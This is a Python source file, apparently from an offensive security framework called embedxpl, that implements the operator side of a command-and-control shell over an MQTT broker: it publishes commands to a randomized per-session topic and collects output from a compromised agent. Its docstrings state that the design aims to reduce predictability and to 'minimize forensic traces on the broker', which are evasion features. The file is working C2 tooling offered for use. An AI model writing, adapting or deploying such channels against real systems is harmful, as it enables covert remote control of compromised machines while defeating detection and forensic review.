"""MQTT shell engine - C2 via MQTT broker.

Provides a command-and-control shell using MQTT publish/subscribe.
Commands are published to a per-session command topic; output is received
on a corresponding output topic.  Topic names are randomized to reduce
predictability.

Author: Andre Henrique (LinkedIn/X: @mrhenrike)
Version: 0.1.0
"""

from __future__ import annotations

import logging
import queue
import secrets
import ssl
import threading
import time
from typing import Optional

from embedxpl.core.shells.shell_engine import (
    ShellConnectionError,
    ShellEngine,
    ShellIOError,
    ShellStatus,
    ShellTimeoutError,
)

logger = logging.getLogger(__name__)

_QOS = 1
_DEFAULT_KEEPALIVE = 60
_TOPIC_PREFIX_LEN = 8


def _random_topic_prefix() -> str:
    """Generate a random topic prefix to avoid predictable names."""
    return secrets.token_hex(_TOPIC_PREFIX_LEN)


class MQTTShell(ShellEngine):
    """C2 shell over an MQTT broker.

    The engine connects to a broker as a regular MQTT client and uses
    two topics per session:

    - ``<prefix>/cmd``  : operator publishes commands here
    - ``<prefix>/out``  : agent publishes output here

    Topic prefix is randomized at session creation.  QoS 1 ensures
    at-least-once delivery.  No persistent sessions are used
    (clean_session=True) to minimize forensic traces on the broker.

    Requires the ``paho-mqtt`` package.

    Args:
        remote_host: MQTT broker hostname or IP.
        remote_port: MQTT broker port (1883 plain, 8883 TLS).
        timeout: Connection and I/O timeout in seconds.
        use_tls: Enable TLS for the broker connection.
        username: Optional MQTT username.
        password: Optional MQTT password.
        topic_prefix: Override the random topic prefix (useful for
                      reconnecting to an existing session).
        keepalive: MQTT keepalive interval in seconds.
    """

    def __init__(
        self,
        remote_host: str,
        remote_port: int = 1883,
        timeout: float = 30.0,
        use_tls: bool = False,
        username: Optional[str] = None,
        password: Optional[str] = None,
        topic_prefix: Optional[str] = None,
        keepalive: int = _DEFAULT_KEEPALIVE,
    ) -> None:
        super().__init__(
            remote_host=remote_host,
            remote_port=remote_port,
            transport_type="mqtt",
            timeout=timeout,
        )
        self._use_tls: bool = use_tls
        self._username: Optional[str] = username
        self._password: Optional[str] = password
        self._keepalive: int = max(10, keepalive)
        self._topic_prefix: str = topic_prefix or _random_topic_prefix()
        self._cmd_topic: str = "{}/cmd".format(self._topic_prefix)
        self._out_topic: str = "{}/out".format(self._topic_prefix)
        self._client = None  # paho.mqtt.client.Client
        self._inbox: queue.Queue = queue.Queue()
        self._connected_event: threading.Event = threading.Event()

    # ------------------------------------------------------------------
    # Properties
    # ------------------------------------------------------------------

    @property
    def cmd_topic(self) -> str:
        """MQTT topic for commands."""
        return self._cmd_topic

    @property
    def out_topic(self) -> str:
        """MQTT topic for agent output."""
        return self._out_topic

    @property
    def topic_prefix(self) -> str:
        """Session topic prefix."""
        return self._topic_prefix

    # ------------------------------------------------------------------
    # Connection
    # ------------------------------------------------------------------

    def connect(self) -> bool:
        """Connect to the MQTT broker and subscribe to the output topic.

        Returns:
            True on success.

        Raises:
            ShellConnectionError: On broker connectivity issues.
        """
        try:
            import paho.mqtt.client as mqtt  # type: ignore[import-untyped]
        except ImportError as exc:
            raise ShellConnectionError(
                "paho-mqtt package is required: pip install paho-mqtt"
            ) from exc

        self._set_status(ShellStatus.CONNECTING)
        client_id = "exf-{}".format(secrets.token_hex(6))

        try:
            client = mqtt.Client(
                client_id=client_id,
                clean_session=True,
                protocol=mqtt.MQTTv311,
            )
        except TypeError:
            client = mqtt.Client(
                mqtt.CallbackAPIVersion.VERSION1,
                client_id=client_id,
                clean_session=True,
                protocol=mqtt.MQTTv311,
            )

        if self._username:
            client.username_pw_set(self._username, self._password)

        if self._use_tls:
            ctx = ssl.create_default_context()
            client.tls_set_context(ctx)

        client.on_connect = self._on_connect
        client.on_message = self._on_message
        client.on_disconnect = self._on_disconnect

        try:
            client.connect(
                self._remote_host,
                self._remote_port,
                keepalive=self._keepalive,
            )
        except OSError as exc:
            self._set_status(ShellStatus.ERROR, str(exc))
            raise ShellConnectionError(str(exc)) from exc

        client.loop_start()
        self._client = client

        if not self._connected_event.wait(timeout=self._timeout):
            client.loop_stop()
            self._set_status(ShellStatus.ERROR, "Connection timed out")
            raise ShellConnectionError("MQTT connection timed out")

        client.subscribe(self._out_topic, qos=_QOS)
        logger.info(
            "MQTT shell connected to %s:%d (prefix=%s)",
            self._remote_host,
            self._remote_port,
            self._topic_prefix,
        )
        return True

    # ------------------------------------------------------------------
    # I/O
    # ------------------------------------------------------------------

    def send(self, cmd: str) -> int:
        """Publish a command to the MQTT command topic.

        Args:
            cmd: Command string.

        Returns:
            Number of bytes published.

        Raises:
            ShellIOError: If the client is not connected.
        """
        self._require_connected()
        payload = cmd.strip().encode("utf-8", errors="replace")
        info = self._client.publish(self._cmd_topic, payload, qos=_QOS)
        if info.rc != 0:
            raise ShellIOError("MQTT publish failed (rc={})".format(info.rc))
        logger.debug("Published %d bytes to %s", len(payload), self._cmd_topic)
        return len(payload)

    def recv(self, timeout: Optional[float] = None) -> str:
        """Receive output from the MQTT output topic.

        Args:
            timeout: Override default timeout.

        Returns:
            Decoded output string (empty on timeout).
        """
        self._require_connected()
        wait = timeout if timeout is not None else self._timeout
        try:
            data = self._inbox.get(timeout=wait)
            return data.decode("utf-8", errors="replace") if isinstance(data, bytes) else str(data)
        except queue.Empty:
            return ""

    # ------------------------------------------------------------------
    # Lifecycle
    # ------------------------------------------------------------------

    def close(self) -> None:
        """Disconnect from the MQTT broker."""
        if self._client is not None:
            try:
                self._client.unsubscribe(self._out_topic)
                self._client.disconnect()
                self._client.loop_stop()
            except Exception:
                pass
        self._client = None
        self._connected_event.clear()
        self._set_status(ShellStatus.DISCONNECTED)
        logger.info("MQTTShell closed (prefix=%s)", self._topic_prefix)

    def is_alive(self) -> bool:
        """Check if the MQTT client is connected."""
        return (
            self._status == ShellStatus.CONNECTED
            and self._client is not None
            and self._client.is_connected()
        )

    # ------------------------------------------------------------------
    # MQTT callbacks
    # ------------------------------------------------------------------

    def _on_connect(self, client, userdata, flags, rc) -> None:  # noqa: ANN001
        """Handle successful broker connection."""
        if rc == 0:
            self._set_status(ShellStatus.CONNECTED)
            self._connected_event.set()
            logger.debug("MQTT CONNACK rc=0")
        else:
            self._set_status(ShellStatus.ERROR, "CONNACK rc={}".format(rc))
            logger.error("MQTT CONNACK rc=%d", rc)

    def _on_message(self, client, userdata, msg) -> None:  # noqa: ANN001
        """Queue incoming messages from the output topic."""
        if msg.topic == self._out_topic:
            self._inbox.put(msg.payload)

    def _on_disconnect(self, client, userdata, rc) -> None:  # noqa: ANN001
        """Handle unexpected disconnection."""
        if rc != 0:
            logger.warning("MQTT unexpected disconnect (rc=%d)", rc)
            self._set_status(ShellStatus.ERROR, "Unexpected disconnect rc={}".format(rc))
        self._connected_event.clear()

    # ------------------------------------------------------------------
    # Internals
    # ------------------------------------------------------------------

    def _require_connected(self) -> None:
        if self._status != ShellStatus.CONNECTED or self._client is None:
            raise ShellIOError(
                "Shell not connected (status={})".format(self._status.value)
            )
